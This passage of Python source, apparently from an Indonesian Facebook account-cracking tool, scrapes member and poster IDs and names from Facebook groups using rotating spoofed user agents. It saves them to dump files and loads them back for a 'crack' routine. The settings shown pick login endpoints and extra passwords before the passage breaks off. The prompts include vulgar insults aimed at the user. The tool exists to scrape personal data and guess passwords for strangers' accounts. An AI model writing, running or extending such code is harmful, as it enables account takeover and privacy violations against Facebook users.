(X11; Linux x86_64; sl-SI) Presto/2.12.337 Version/12.00','Internet Explorer','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/5.1)','Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_6) AppleWebKit/5340 (KHTML, like Gecko) Chrome/37.0.895.0 Mobile Safari/5340','Mozilla/5.0 (Windows NT 5.2) AppleWebKit/5350 (KHTML, like Gecko) Chrome/36.0.887.0 Mobile Safari/5350','Mozilla/5.0 (Windows NT 5.0; sl-SI; rv:1.9.0.20) Gecko/20141124 Firefox/37.0','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_1 rv:6.0; en-US) AppleWebKit/532.5.5 (KHTML, like Gecko) Version/5.0.5 Safari/532.5.5','Opera/9.77 (Windows NT 5.2; en-US) Presto/2.12.336 Version/12.00','Internet Explorer','Mozilla/5.0 (compatible; MSIE 5.0; Windows CE; Trident/3.0)','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.115 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.114 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.115 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.114 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.114 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.115 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.114 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.115 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.115 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.114 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.114 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.115 Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/60.0.3112.115 Chrome/60.0.3112.113 Safari/537.36','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Deepnet Explorer 1.5.0; .NET CLR 2.0.50727)','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; Deepnet Explorer 1.5.3; Smart 2x2; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Deepnet Explorer 1.5.3; Smart 2x2; InfoPath.2)','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Wanadoo042NLPP01HCFFFFFFEC; Deepnet Explorer 1.5.3; Smart 2x2; .NET CLR 1.1.4322; GreenBrowser)','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Deepnet Explorer 1.5.2; .NET CLR 1.1.4322)','Mozilla/5.0 (Linux; Android 4.2.2; Le Pan TC802A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36','Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/6.0.51363 Mobile/11D257 Safari/9537.53','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:37.0) Gecko/20100101 Firefox/37.0','Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; Lumia 1520) like Gecko','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0','Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; 360SE)','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; PRU_IE; rv:11.0) like Gecko','Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36','Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPad4,1;FBMD/iPad;FBSN/iPhone OS;FBSV/8.4.1;FBSS/2; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP02; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)','Mozilla/5.0 (X11; CrOS x86_64 6946.63.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:37.0) Gecko/20100101 Firefox/37.0','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36','Mozilla/5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36','Mozilla/5.0 (Linux; Android 4.2.2; QMV7B Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko','Mozilla/5.0 (compatible; MSIE 10.0; AOL 9.7; AOLBuild 4343.1028; Windows NT 6.1; WOW64; Trident/7.0)','Mozilla/5.0 (Linux; U; Android 4.0.3; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko','Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; Active Content Browser)','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; WebView/1.0)','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36','Mozilla/5.0 (iPad; U; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/50.0.125 Chrome/44.0.2403.125 Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAARJS; rv:11.0) like Gecko','Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4','BlackBerry5876/4.1.0.880 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/663','BlackBerry7230/4.5.0.507 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/741','BlackBerry4152/3.2.0.915 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/233','BlackBerry7903/3.3.0.986 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/174','BlackBerry7364/5.0.0.655 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/936','BlackBerry7207/1.5.0.915 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/723','BlackBerry8214/4.1.0.663 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/973','BlackBerry4520/3.4.0.669 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/262','BlackBerry7597/4.6.0.589 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/807','BlackBerry7480/4.2.0.919 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/221','BlackBerry9005/3.3.0.115 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/741','BlackBerry5146/3.4.0.220 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/586','BlackBerry9462/5.3.0.468 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/235','BlackBerry4563/4.6.0.321 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/797','BlackBerry8488/2.2.0.307 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/766','BlackBerry8769/3.6.0.352 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/418','BlackBerry7989/2.1.0.394 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/951','BlackBerry9933/2.5.0.145 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/860','BlackBerry6158/3.0.0.482 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/293','BlackBerry5631/1.0.0.797 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179','BlackBerry5194/3.5.0.560 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/996','BlackBerry8944/3.3.0.911 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/710','BlackBerry9458/5.5.0.846 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/689','BlackBerry5491/2.6.0.521 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/619','BlackBerry6668/4.4.0.788 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/912','BlackBerry9158/2.2.0.967 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/443','BlackBerry6684/1.6.0.176 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/686','BlackBerry7211/4.4.0.178 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/460','BlackBerry9168/2.0.0.204 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/705','BlackBerry6423/2.1.0.798 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/440','BlackBerry7193/4.2.0.182 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/221','BlackBerry7830/3.5.0.984 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/776','BlackBerry6921/3.5.0.798 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/868','BlackBerry6885/3.2.0.480 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/157','BlackBerry5745/2.0.0.654 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/734','BlackBerry5750/3.6.0.119 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/335','BlackBerry4371/2.6.0.799 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/661','BlackBerry4524/4.0.0.279 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/975','BlackBerry4286/1.5.0.346 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/585','BlackBerry9826/2.1.0.752 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/158','BlackBerry6918/4.5.0.511 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/427','BlackBerry4224/1.4.0.963 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102','BlackBerry7923/4.0.0.212 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/487','BlackBerry7125/1.6.0.585 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/865','BlackBerry7437/4.1.0.176 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/358','BlackBerry8301/1.6.0.248 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/684','BlackBerry7399/2.1.0.756 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/943','BlackBerry6706/3.4.0.890 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/763','BlackBerry9681/1.4.0.848 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/774','BlackBerry5062/4.0.0.773 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/677','BlackBerry8109/5.2.0.225 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/243','BlackBerry4620/3.1.0.511 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/325','BlackBerry4885/4.2.0.881 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/186','BlackBerry7893/3.2.0.737 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/885','BlackBerry6808/4.0.0.938 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/432','BlackBerry6285/3.3.0.385 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/300','BlackBerry9838/2.1.0.455 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/752','BlackBerry8046/1.4.0.825 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/528','BlackBerry7974/4.6.0.264 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/801','BlackBerry6849/2.3.0.256 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/317','BlackBerry6770/4.6.0.939 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/844','BlackBerry7877/3.1.0.345 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/807','BlackBerry9279/3.2.0.576 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/679','BlackBerry8862/2.3.0.503 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/478','BlackBerry8795/3.4.0.844 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/678','BlackBerry5094/4.6.0.682 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/970','BlackBerry9121/1.4.0.642 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/815','BlackBerry9861/4.0.0.531 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/211','BlackBerry9973/1.5.0.871 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/563','BlackBerry6176/2.3.0.617 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/130','BlackBerry7798/5.0.0.703 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/324','BlackBerry9521/5.6.0.333 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/304','BlackBerry9057/3.5.0.442 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/140','BlackBerry5316/1.5.0.791 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/239','BlackBerry7690/5.3.0.968 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/169','BlackBerry7680/4.6.0.638 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/212','BlackBerry8453/3.6.0.537 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/890','BlackBerry8495/3.0.0.669 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/895','BlackBerry7724/1.6.0.298 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/252','BlackBerry7294/3.6.0.512 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/343','BlackBerry8843/3.1.0.459 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/611','BlackBerry6209/5.5.0.976 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/121','BlackBerry8373/4.6.0.231 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/366','BlackBerry5249/4.5.0.530 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/466','BlackBerry6502/5.1.0.632 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/475','BlackBerry5785/3.3.0.918 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/300','BlackBerry5836/1.6.0.839 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/172','BlackBerry5897/2.5.0.160 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/159','BlackBerry4478/1.5.0.773 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/867','BlackBerry8926/3.6.0.393 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/627','BlackBerry6875/3.4.0.216 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/591','BlackBerry5117/1.1.0.648 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/152','BlackBerry6752/5.1.0.324 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/538','BlackBerry6943/5.1.0.858 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/412','BlackBerry8327/5.6.0.310 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/310','BlackBerry8320/2.6.0.753 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/282','BlackBerry7710/4.4.0.200 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/878','BlackBerry5186/4.5.0.226 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/356','BlackBerry9003/4.5.0.110 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/996','BlackBerry8709/3.3.0.348 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/446','BlackBerry6002/5.2.0.524 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/131','BlackBerry7579/4.0.0.101 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/683','BlackBerry9945/5.3.0.364 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/306'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser')
	except requests.exceptions.ConnectionError:
		print('>> Sinyal Loo Kek Kontol ')
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print(" Terkena Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		grup()
	elif berr2=='Kesalahan':
		alvino_xy('>> Grup Tidak Di Temukan ')
		time.sleep(0.5)
		grup()
	else:pass
	print(f'{x}>> Nama Grup : {b}%s'%(berr2))
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(" Anggota : -")
	else:
		print(f'{x}>> Anggota : {h}%s'%(ang[0]))
	grup1(url)
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{x}>> Sedang Mengumpulkan Idz ')
	print(f'>> Klik {k}Ctrl+C{x} Untuk {m}Stop{x} Dump !!')
	while True:
		try:
			ua = 'Mozilla/5.0 (linux; U; Android 6;  en-us; GT-P902L)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4256.60 Mobile Safari/537.36'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						xy = random.choice([m,k,h,u,b,x])
						print(f'\r	———>> {x}({xy} %s {x}) <<———'%(len(id)), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://mbasic.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/ALVINO-DUMP')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] ALVINO-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 4 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{k}x{x}] Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/ALVINO-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/ALVINO-DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	io = '''[bold cyan][01] Tua 	 \n[02]Random''' 
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='[bold cyan] INPUT [/bold cyan]'))
	hu = input(' pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	
	io = '''[bold cyan][01] http://free.faceebok.com
[02] http://Touch.facebook.com\n[03]http://mbasic.facebook.com
[04] http://m.facebook.com\n[05] http://Iphone.facebook.com
[06] http://Web.facebook.com\n[07] http://web.facebook.com
[08] http://D.facebook.com[bold cyan]'''
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='[bold cyan] • METODE🖕😈 • [/bold cyan]'))
	hc = input('INPUT: ')
	if hc in ['1','2','3','4','5','6','7','8','9']:
		method.append('mobile')
	elif hc in ['']:
		print('>> Pilih Yang Bener Kontol ')
		setting()
#	elif hc in ['2','02']:
#		method.append('free')
#	elif hc in ['3','03']:
#		method.append('touch')
#	elif hc in ['4','04']:
	#	method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	_jembot_ = input('Tambahkan Aplikasi ( y/t ) ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('Tambahkan Password Manual ( y/t ) ')
